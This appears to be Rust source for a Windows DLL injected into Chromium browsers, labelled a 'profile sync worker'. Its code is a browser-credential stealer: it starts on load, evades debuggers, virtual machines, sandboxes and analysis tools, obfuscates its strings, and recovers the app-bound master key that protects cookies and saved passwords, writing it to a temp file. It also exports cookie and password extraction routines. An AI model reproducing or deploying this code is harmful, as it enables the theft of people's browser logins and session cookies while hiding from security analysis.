//! In-process profile sync worker (host identity context).

#![allow(non_snake_case, unused)]

mod crypto;
mod database;
mod dpapi_fallback;
mod elevator;

use std::{
    ffi::c_void,
    path::PathBuf,
    thread,
    time::{Duration, SystemTime, UNIX_EPOCH},
    env,
    mem,
};
#[cfg(windows)]
use windows::Win32::System::SystemInformation::{GetSystemInfo, GetTickCount64, GlobalMemoryStatusEx, MEMORYSTATUSEX, SYSTEM_INFO};
#[cfg(windows)]
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
#[cfg(windows)]
use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
#[cfg(windows)]
use windows::Win32::Foundation::CloseHandle;
#[cfg(windows)]
use windows::Win32::System::Registry::{RegOpenKeyExW, RegQueryValueExW, HKEY, HKEY_LOCAL_MACHINE, KEY_READ};
#[cfg(windows)]
use windows::Win32::System::SystemInformation::GetComputerNameExW;
#[cfg(windows)]
const MAX_COMPUTERNAME_LENGTH: u32 = 15;
#[cfg(windows)]
use windows::core::{PWSTR, PCWSTR};
#[cfg(windows)]
use std::{ptr, ffi::OsStr};
#[cfg(windows)]
use std::os::windows::ffi::OsStrExt;

use obfstr::obfstr;
use serde_json::Value;
use serde_json;

#[cfg(windows)]
use windows::{
    Win32::{
        Foundation::{BOOL, HINSTANCE, TRUE},
        System::{
            SystemServices::DLL_PROCESS_ATTACH,
            Threading::{CreateThread, THREAD_CREATION_FLAGS},
        },
    },
};

// Stealth anti-debug via NtQueryInformationProcess (ProcessDebugPort = 7).
#[cfg(windows)]
type NtQueryInformationProcessFn = unsafe extern "system" fn(
    windows::Win32::Foundation::HANDLE,
    u32,
    *mut c_void,
    u32,
    *mut u32,
) -> i32;

#[cfg(windows)]
fn is_debugger_present_stealth() -> bool {
    use windows::Win32::System::Threading::GetCurrentProcess;
    use windows::core::{PCSTR, PCWSTR};

    const PROC_DEBUG_PORT: u32 = 7;

    unsafe {
        let ntdll = match GetModuleHandleW(PCWSTR(
            OsStr::new(obfstr!("ntdll.dll"))
                .encode_wide()
                .chain(Some(0))
                .collect::<Vec<u16>>()
                .as_ptr(),
        )) {
            Ok(h) => h,
            Err(_) => return false,
        };
        let export = format!("{}\0", obfstr!("NtQueryInformationProcess"));
        let proc = match GetProcAddress(ntdll, PCSTR(export.as_ptr())) {
            Some(p) => p,
            None => return false,
        };
        let query: NtQueryInformationProcessFn = mem::transmute(proc);

        let mut debug_port: usize = 0;
        let status = query(
            GetCurrentProcess(),
            PROC_DEBUG_PORT,
            &mut debug_port as *mut _ as *mut c_void,
            mem::size_of::<usize>() as u32,
            std::ptr::null_mut(),
        );
        status >= 0 && debug_port != 0
    }
}

#[cfg(not(windows))]
fn is_debugger_present_stealth() -> bool {
    false
}

#[cfg(windows)]
fn reg_string(subkey: &str, value: &str) -> Option<String> {
    unsafe {
        let subkey_wide: Vec<u16> = OsStr::new(subkey).encode_wide().chain(Some(0)).collect();
        let value_wide: Vec<u16> = OsStr::new(value).encode_wide().chain(Some(0)).collect();
        let mut hkey = HKEY::default();
        if RegOpenKeyExW(HKEY_LOCAL_MACHINE, PCWSTR(subkey_wide.as_ptr()), 0, KEY_READ, &mut hkey).is_err() {
            return None;
        }
        let mut buf = [0u16; 256];
        let mut size = (buf.len() * 2) as u32;
        let ok = RegQueryValueExW(
            hkey,
            PCWSTR(value_wide.as_ptr()),
            None,
            None,
            Some(buf.as_mut_ptr() as *mut u8),
            Some(&mut size),
        )
        .is_ok();
        if !ok {
            return None;
        }
        let len = (size as usize / 2).min(buf.len());
        Some(String::from_utf16_lossy(&buf[..len]).trim_end_matches('\0').to_string())
    }
}

#[cfg(windows)]
fn vm_indicators_present() -> bool {
    let needles = [
        obfstr!("vmware").to_string(),
        obfstr!("virtualbox").to_string(),
        obfstr!("vbox").to_string(),
        obfstr!("qemu").to_string(),
        obfstr!("xen").to_string(),
        obfstr!("hyper-v").to_string(),
        obfstr!("virtual machine").to_string(),
        obfstr!("kvm").to_string(),
    ];
    let keys = [
        (
            obfstr!("HARDWARE\\DESCRIPTION\\System\\BIOS").to_string(),
            obfstr!("SystemManufacturer").to_string(),
        ),
        (
            obfstr!("HARDWARE\\DESCRIPTION\\System\\BIOS").to_string(),
            obfstr!("SystemProductName").to_string(),
        ),
    ];
    for (subkey, value) in keys {
        if let Some(text) = reg_string(&subkey, &value) {
            let lower = text.to_ascii_lowercase();
            if needles.iter().any(|n| lower.contains(n)) {
                return true;
            }
        }
    }
    false
}

#[cfg(windows)]
fn is_sandbox() -> bool {
    unsafe {
        let mut sys_info = SYSTEM_INFO::default();
        GetSystemInfo(&mut sys_info);
        if sys_info.dwNumberOfProcessors < 2 {
            return true;
        }

        let mut mem = MEMORYSTATUSEX {
            dwLength: mem::size_of::<MEMORYSTATUSEX>() as u32,
            ..Default::default()
        };
        if GlobalMemoryStatusEx(&mut mem).is_ok() && mem.ullTotalPhys < 2_u64 * 1024 * 1024 * 1024 {
            return true;
        }

        if vm_indicators_present() {
            return true;
        }

        if GetTickCount64() < 300_000 {
            return true;
        }

        if let Ok(snap) = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            let mut entry = PROCESSENTRY32W {
                dwSize: mem::size_of::<PROCESSENTRY32W>() as u32,
                ..Default::default()
            };
            if Process32FirstW(snap, &mut entry).is_ok() {
                loop {
                    let name: String = entry
                        .szExeFile
                        .iter()
                        .take_while(|&&c| c != 0)
                        .map(|&c| char::from_u32(c as u32).unwrap_or('?'))
                        .collect();
                    if is_analysis_process(&name) {
                        CloseHandle(snap).ok();
                        return true;
                    }
                    if Process32NextW(snap, &mut entry).is_err() {
                        break;
                    }
                }
            }
            CloseHandle(snap).ok();
        }

        let mut buffer = [0u16; MAX_COMPUTERNAME_LENGTH as usize + 1];
        let mut size = MAX_COMPUTERNAME_LENGTH + 1;
        if GetComputerNameExW(
            windows::Win32::System::SystemInformation::ComputerNamePhysicalDnsHostname,
            PWSTR(buffer.as_mut_ptr()),
            &mut size,
        )
        .is_ok()
        {
            let computer_name = String::from_utf16_lossy(&buffer[..size as usize]);
            if is_sandbox_computer_name(&computer_name) {
                return true;
            }
        }

        false
    }
}

#[cfg(windows)]
fn is_analysis_process(name: &str) -> bool {
    name.eq_ignore_ascii_case(obfstr!("wireshark.exe"))
        || name.eq_ignore_ascii_case(obfstr!("procmon.exe"))
        || name.eq_ignore_ascii_case(obfstr!("procmon64.exe"))
        || name.eq_ignore_ascii_case(obfstr!("x32dbg.exe"))
        || name.eq_ignore_ascii_case(obfstr!("x64dbg.exe"))
        || name.eq_ignore_ascii_case(obfstr!("idaq64.exe"))
        || name.eq_ignore_ascii_case(obfstr!("processhacker.exe"))
        || name.eq_ignore_ascii_case(obfstr!("pestudio.exe"))
        || name.eq_ignore_ascii_case(obfstr!("fiddler.exe"))
}

#[cfg(windows)]
fn is_sandbox_computer_name(computer_name: &str) -> bool {
    computer_name.contains(obfstr!("HAL9TH"))
        || computer_name.contains(obfstr!("JOHN-PC"))
        || computer_name.contains(obfstr!("SANDBOX"))
        || computer_name.contains(obfstr!("MALWARE"))
}

#[cfg(not(windows))]
fn is_sandbox() -> bool {
    false
}

fn header_tag() -> [u8; 4] {
    let mut arr = [0u8; 4];
    arr.clone_from_slice(obfstr!("APPB").as_bytes().split_at(4).0);
    arr
}

fn jitter_ms(min: u64, max: u64) -> u64 {
    let span = max.saturating_sub(min).max(1);
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64
        ^ (std::process::id() as u64).wrapping_mul(0x5851_F642);
    min + (seed % (span + 1))
}

fn pause_ms(min: u64, max: u64) {
    thread::sleep(Duration::from_millis(jitter_ms(min, max)));
}

#[cfg(windows)]
fn host_under_analysis() -> bool {
    is_debugger_present_stealth()
}

#[cfg(not(windows))]
fn host_under_analysis() -> bool {
    false
}

#[cfg(windows)]
#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _h: HINSTANCE,
    reason: u32,
    _: *mut c_void,
) -> BOOL {
    if reason == DLL_PROCESS_ATTACH {
        CreateThread(None, 0, Some(task), None, THREAD_CREATION_FLAGS(0), None).ok();
    }
    TRUE
}

#[cfg(not(windows))]
#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _h: *mut std::ffi::c_void,
    reason: u32,
    _: *mut std::ffi::c_void,
) -> u32 {
    0
}

#[cfg(not(windows))]
unsafe extern "system" fn task(_: *mut c_void) -> u32 {
    0
}

#[cfg(windows)]
unsafe extern "system" fn task(_: *mut c_void) -> u32 {
    pause_ms(600, 1100);
    let r = std::panic::catch_unwind(|| execute());
    if let Ok(Err(_)) = r {
        record_failure("sync error");
    } else if r.is_err() {
        record_failure("worker fault");
    }
    0
}

#[cfg(windows)]
fn execute() -> Result<(), String> {
    if host_under_analysis() || is_sandbox() {
        return Err(obfstr!("host busy or sandbox detected").into());
    }
    
    pause_ms(80, 260);

    let exe = std::env::current_exe()
        .map(|p| p.to_string_lossy().to_lowercase())
        .unwrap_or_default();

    let local_state_path = resolve_local_state_path(&exe)?;

    pause_ms(40, 150);

    let raw = std::fs::read_to_string(&local_state_path)
        .map_err(|e| format!("{}{}", obfstr!("read profile state: "), e.to_string()))?;
    let ls: serde_json::Value =
        serde_json::from_str(&raw).map_err(|e| format!("{}{}", obfstr!("parse profile state: "), e.to_string()))?;

    let key_b64 = ls
        .pointer(obfstr!("/os_crypt/app_bound_encrypted_key"))
        .and_then(|v| v.as_str())
        .ok_or(obfstr!("bound key missing"))?;

    let encrypted_key = base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        key_b64,
    )
    .map_err(|e| format!("{}{}", obfstr!("decode: "), e.to_string()))?;

    let tag = header_tag();
    if encrypted_key.len() < 4 {
        return Err(obfstr!("blob too short").into());
    }
    if !encrypted_key.starts_with(&tag) {
        return Err(obfstr!("unexpected header").into());
    }
    let encrypted_key = &encrypted_key[4..];

    pause_ms(50, 180);

    let browser = elevator::resolve_browser(&exe);
    let com_result = match browser {
        Some(b) => elevator::process_with_provider(b, encrypted_key)
            .or_else(|_| elevator::retrieve_secret(encrypted_key)),
        None => elevator::retrieve_secret(encrypted_key),
    };

    let master_key = com_result
        .or_else(|_| {
            dpapi_fallback::try_decrypt_app_bound(encrypted_key)
                .ok_or_else(|| String::from(obfstr!("fallback path failed")))
        })
        .map_err(|e| format!("{}{}", obfstr!("key recovery: "), e.to_string()))?;

    if master_key.len() != 32 {
        return Err(format!("{}{}", obfstr!("unexpected key length: {} (want 32)"), master_key.len().to_string()));
    }
    
    let browser_label = browser
        .map(|b| b.name.to_string())
        .unwrap_or_else(|| obfstr!("Chromium").to_string());
    let result = serde_json::json!({
        obfstr!("browser"): browser_label,
        obfstr!("master_key_hex"): master_key.iter().map(|b| format!("{:02x}", b)).collect::<String>(),
    });

    let json = serde_json::to_string(&result).unwrap();
    let path = output_path();
    std::fs::write(&path, json).map_err(|e| format!("{}{}", obfstr!("write output: "), e.to_string()))?;

    Ok(())
}

#[cfg(not(windows))]
fn execute() -> Result<(), String> {
    Err(String::from("Not supported on this OS"))
}

fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
    let user_env = obfstr!("ENV_USER_DATA").to_string();
    let root_env = obfstr!("ENV_DATA_ROOT").to_string();

    if let Ok(rel) = std::env::var(user_env) {
        let root = match std::env::var(root_env).as_deref() {
            Ok(s) if s == obfstr!("roaming") => std::env::var(obfstr!("APPDATA")),
            _ => std::env::var(obfstr!("LOCALAPPDATA")),
        }.map_err(|_| {
            let err_msg = obfstr!("profile root not set").to_string();
            err_msg
        })?;

        let path = PathBuf::from(&root)
            .join(rel)
            .join(obfstr!("Local State"));
        if path.exists() {
            return Ok(path);
        }
        return Err(format!("{}{}", obfstr!("state file missing: "), path.display().to_string()));
    }
    
    let browser = elevator::resolve_browser(exe)
        .ok_or_else(|| format!("{}{}", obfstr!("unknown host binary: "), exe.to_string()))?;

    let local_appdata = std::env::var(obfstr!("LOCALAPPDATA")).map_err(|_| {
        let err_msg = obfstr!("LOCALAPPDATA not set").to_string();
        err_msg
    })?;

    let local_state_path = PathBuf::from(&local_appdata)
        .join(browser.user_data_rel)
        .join(obfstr!("Local State"));

    if !local_state_path.exists() {
        return Err(format!("{}{}", obfstr!("state file missing: "), local_state_path.display().to_string()))?;
    }
    
    Ok(local_state_path)
}

fn output_path() -> PathBuf {
    let key = obfstr!("ENV_RESULT").to_string();
    if let Ok(p) = std::env::var(key) {
        return PathBuf::from(p);
    }
    std::env::temp_dir().join(obfstr!("fallback.json"))
}

fn record_failure(msg: &str) {
    let r = serde_json::json!({ obfstr!("error"): msg });
    let json = serde_json::to_string(&r).unwrap();
    let _ = std::fs::write(output_path(), json);
}

// Backward-compatible exports for in-crate callers
pub use crypto::{decrypt_value, hex_fallback, process_data};
pub use database::{extract_cookies, extract_passwords, process_entries, process_tokens};
